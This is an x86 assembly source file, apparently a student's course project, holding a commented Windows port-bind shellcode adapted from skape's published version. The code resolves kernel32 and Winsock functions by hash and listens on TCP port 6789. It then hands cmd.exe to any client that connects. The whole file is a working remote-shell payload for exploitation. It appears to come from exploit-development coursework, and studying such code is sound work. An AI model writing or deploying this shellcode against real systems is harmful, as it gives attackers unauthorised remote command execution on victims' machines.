; nasm -f bin win_shellcode.asm

;--------------------------------------------
; Name: Josh Bundt
; Class: CS4678
; Final Project
; File: shellcode modified from skape
; Last modified: 24 Mar 2012
;---------------------------------------------

;	/*
;	 * Generic portbind shellcode for win32 (NT-based versions)
;	 * Overview
;	 *    Bind to a TCP port and redirect cmd.exe to a client connection.
;	 * Targets
;	 *    NT/2K/XP
;	 *
;	 * skape
;	 * mmiller@hick.org
;	 */

USE32

portbind:
	jmp startup_bnc                     ; Jump to the startup bounce point

;	/*
;	 * find_kernel32 -- PEB
;	 *
;	 * size     : 32 bytes
;	 * method   : Lookup the PEB and walk one node back in the loaded
;	 *            module list.  Extract the base address from this entry.
;	 *            It should point to kernel32.dll.
;	 * targets  : 95/98/ME/NT/2K/XP
;	 * arguments: none
;	 */
find_kernel32:
	push  esi
	xor   eax, eax
	mov   eax, [fs:0x30]          ; Extract the PEB
	mov   eax, [eax + 0x0c]       ; Extract the PROCESS_MODULE_INFO pointer from the PEB
	mov   esi, [eax + 0x1c]       ; Get the address of flink in the init module list
	lodsd                         ; Load the address of blink into eax
	mov   eax, [eax + 0x8]        ; Grab the module base address from the list entry
	pop   esi
	ret
	
;	/*
;	 * find_function
;	 *
;	 * method   : Walks the export list of the given image
;	 *            until it finds a symbol whose hashed name
;	 *            matches the one that was passed in.
;	 * targets  : 95/98/ME/NT/2K/XP
;	 * arguments: [esp + 0x24] (library base address)
;	 *            [esp + 0x28] (function hash)
;	 * return   : eax (resultant function address)
;	 * clobbers : eax
;	 */
find_function:
	pushad                        ; Save all registers
	mov   ebp, [esp + 0x24]       ; Store the base address in eax
	mov   eax, [ebp + 0x3c]       ; PE header VMA
	mov   edi, [ebp + eax + 0x78] ; Export table relative offset
	add   edi, ebp                ; Export table VMA
	mov   ecx, [edi + 0x18]       ; Number of names
	mov   ebx, [edi + 0x20]       ; Names table relative offset
	add   ebx, ebp                ; Names table VMA
find_function_loop:
	jecxz find_function_finished  ; Jump to the end if ecx is 0
	dec   ecx                     ; Decrement our names counter
	mov   esi, [ebx + ecx * 4]    ; Store the relative offset of the name
	add   esi, ebp                ; Set esi to the VMA of the current name 
compute_hash:
	xor   eax, eax                ; Zero eax
	cdq                           ; Zero edx
	cld                           ; Clear direction
compute_hash_again:
	lodsb                         ; Load the next byte from esi into al
	test  al, al                  ; Test ourselves.
	jz    compute_hash_finished   ; If the ZF is set, we've hit the null term.
	ror   edx, 0xd                ; Rotate edx 13 bits to the right
	add   edx, eax                ; Add the new byte to the accumulator
	jmp   compute_hash_again      ; Next iteration
compute_hash_finished:         
find_function_compare:           
	cmp   edx, [esp + 0x28]       ; Compare the computed hash with the requested hash
	jnz   find_function_loop      ; No match, try the next one.
	mov   ebx, [edi + 0x24]       ; Ordinals table relative offset
	add   ebx, ebp                ; Ordinals table VMA
	mov   cx, [ebx + 2 * ecx]     ; Extrapolate the function's ordinal
	mov   ebx, [edi + 0x1c]       ; Address table relative offset
	add   ebx, ebp                ; Address table VMA
	mov   eax, [ebx + 4 * ecx]    ; Extract the relative function offset from its ordinal
	add   eax, ebp                ; Function VMA
	mov   [esp + 0x1c], eax       ; Overwrite stack version of eax from pushad
find_function_finished:
	popad                         ; Restore all registers
	ret                           ; Return


startup_bnc:
	jmp startup                         ; Jump to the real startup

resolve_symbols_for_dll:
	lodsd                               ; Load the current dword from esi into eax
	push eax                            ; Push the hash as the second argument to find_function
	push edx                            ; Push the base address of the current dll being loaded from
	call find_function                  ; Call find_function
	mov  [edi], eax                     ; Store the return address in the current output buffer pointer
	add  esp, 0x08                      ; Restore eight bytes to the stack.
	add  edi, 0x04                      ; Add 4 bytes to the output buffer to move to the next slot
	cmp  esi, ecx                       ; Have we reached the end?
	jne  resolve_symbols_for_dll        ; If not, continue loading
resolve_symbols_for_dll_finished:
	ret                                 ; Return to the caller

kernel32_symbol_hashes:
	dd	0xec0e4e8e                     ; LoadLibraryA        [0x04]
	dd	0x16b3fe72                     ; CreateProcessA      [0x08]
	dd	0x73e2d87e                     ; ExitProcess         [0x0c]

ws2_32_symbol_hashes:
	dd	0xadf509d9                     ; WSASocketA  minsize: [0x10] regsize: [0x14]
	dd	0xc7701aa4                     ; bind        minsize: [0x14] regsize: [0x18]
	dd	0xe92eada4                     ; listen      minsize: [0x18] regsize: [0x1c]	
	dd	0x498649e5                     ; accept      minsize: [0x1c] regsize: [0x20]

startup:
	sub  esp, 0x60                      ; Allocate 0x60 bytes of stack space
	mov  ebp, esp                       ; Use ebp as the frame pointer

	jmp  get_absolute_address_forward   ; Jump forward past the middle
get_absolute_address_middle:
	jmp  get_absolute_address_end       ; Jump to the end now that we have our VMA on the stack
get_absolute_address_forward:
	call get_absolute_address_middle    ; Call to the middle to push the VMA of 'pop esi' onto the stack
get_absolute_address_end:
	pop  esi                            ; Pop the return address from the stack into esi

	call find_kernel32                  ; Find the kernel32.dll base address through whatever means
	mov  edx, eax                       ; Save the kernel32.dll base address in edx

resolve_kernel32_symbols:
	sub  esi, 0x2a                      ; Offset esi 0x2a bytes back from 'pop esi'
	lea  edi, [ebp + 0x04]              ; Set edi to the start of our output buffer
	mov  ecx, esi                       ; Set ecx to the address of the first hash
	add  ecx, 0x0c                      ; Set the stop point to the first hash address + 0x0c
	call resolve_symbols_for_dll        ; Resolve all the kernel32.dll symbols

resolve_winsock_symbols:
	add  ecx, 0x10                      ; Set the stop point to the first hash of ws2_32 + 0x10
	xor  eax, eax                       ; Zero eax
	mov  ax, 0x3233                     ; Set the low order bytes of eax to '32'
	push eax                            ; Push '32\0\0'
	push 0x5f327377                     ; Push 'ws2_'
	mov  ebx, esp                       ; Save the pointer to the 'ws2_32' string in ebx
	push ecx                            ; Save ecx so that it does not get clobbered
	push edx                            ; Save edx so that it does not get clobbered
	push ebx                            ; Push the 'ws2_32' string pointer onto the stack
	call [ebp + 0x04]                   ; Call LoadLibraryA
	pop  edx                            ; Restore edx
	pop  ecx                            ; Restore ecx
	mov  edx, eax                       ; Set edx to the base address of ws2_32.dll
	call resolve_symbols_for_dll        ; Resolve all the ws2_32.dll symbols

initialize_cmd:
	mov  eax, 0x646d6301                ; Set eax to '\0x01cmd'
	sar  eax, 0x08                      ; Shift eax 8 bits to the right to remove the \0x01 and add a null
	push eax                            ; Push the string onto the stack
	mov  [ebp + 0x34], esp              ; Save the pointer 'cmd' pointer for later use

create_socket:
	xor  eax, eax                       ; Zero eax
	push eax                            ; Push flags (0)
	push eax                            ; Push group (0)
	push eax                            ; Push protocol information (NULL)
	push eax                            ; Push protocol (0)
	inc  eax                            ; Increment eax
	push eax                            ; Push type (SOCK_STREAM)
	inc  eax                            ; Increment eax
	push eax                            ; Push af (AF_INET)
	call [ebp + 0x10]                   ; Call WSASocket
	mov  esi, eax                       ; Save the newly allocated file descriptor in esi

bind:
	xor  eax, eax                       ; Zero eax
	xor  ebx, ebx                       ; Zero ebx
	push eax                            ; Push null
	push eax                            ; Push null
	push eax                            ; Push null
	mov  eax, 0x851a0102                ; Set eax to the sin_port/sin_family attributes of sockaddr_in (default port is 6789)
	dec  ah                             ; Fix the sin_family attribute high order byte
	push eax                            ; Push the sin_port/sin_family
	mov  eax, esp                       ; Save the pointer to the structure in eax
	mov  bl, 0x10                       ; Set the low order byte of ebx to 16
	push ebx                            ; Push the size of the structure 
	push eax                            ; Push the pointer to the sockaddr_in structure
	push esi                            ; Push the file descriptor allocated by WSASocket
	call [ebp + 0x14]                   ; Call bind
listen:
	push ebx                            ; Push a backlog of 16
	push esi                            ; Push the listener file descriptor
	call [ebp + 0x18]                   ; Call listen
accept:
	push ebx                            ; Push 16 for use as the size 
	mov  edx, esp                       ; Save the pointer to the size in edx
	sub  esp, ebx                       ; Allocate 16 bytes of stack space
	mov  ecx, esp                       ; Save the pointer to the client sockaddr_in structure in ecx
	push edx                            ; Push the pointer to the length
	push ecx                            ; Push the pointer to the sockaddr_in structure
	push esi                            ; Push the listen file descriptor
	call [ebp + 0x1c]                   ; Call accept
	mov  esi, eax                       ; Move the newly allocated client file descriptor into esi
	
initialize_process:
	xor  ecx, ecx                       ; Zero ecx
	mov  cl, 0x54                       ; Set ecx to 0x54 (sizeof(PROCESS_INFORMATION) + sizeof(STARTUPINFO))
	sub  esp, ecx                       ; Allocate stack space for the two buffers
	mov  edi, esp                       ; Set edi to point to the start of the buffers
	push edi                            ; Save edi
zero_structs:
	xor  eax, eax                       ; Zero eax for use with zeroing out the structures
	rep  stosb                          ; Repeat storing 0x00 until ecx is 0
	pop  edi                            ; Restore edi to point to the start of the buffers
initialize_structs:
	mov  BYTE [edi], 0x44           ; Set the cb attribute of the STARTUPINFO buffer to 0x44
	inc  BYTE [edi + 0x2d]          ; Set the STARTF_USESTDHANDLES flag
	push edi                            ; Save edi
	mov  eax, esi                       ; Set eax to the file descriptor
	lea  edi, [edi + 0x38]              ; Load the effective address of hStdInput
	stosd                               ; Set hStdInput to the file descriptor
	stosd                               ; Set hStdOutput to the file descriptor
	stosd                               ; Set hStdError to the file descriptor
	pop  edi                            ; Restore edi to point to the start of the buffers
execute_process:
	xor  eax, eax                       ; Zero eax
	lea  esi, [edi + 0x44]              ; Load the effective address of the PROCESS_INFORMATION buffer
	push esi                            ; Push the PROCESS_INFORMATION pointer
	push edi                            ; Push the STARTUPINFO pointer
	push eax                            ; Push Startup Directory (NULL)
	push eax                            ; Push Environment (NULL)
	push eax                            ; Push CreationFlags (0)
	inc  eax                            ; Increment eax
	push eax                            ; Inherit handles (TRUE)
	dec  eax                            ; Decrement eax
	push eax                            ; Thread attributes (NULL)
	push eax                            ; Process attributes (NULL)
	push DWORD [ebp + 0x34]                   ; Command line ('cmd' pointer)
	push eax                            ; Module name (NULL)
	call [ebp + 0x08]                   ; Call CreateProcessA

exit_process:
	call [ebp + 0x0c]                   ; Call ExitProcess
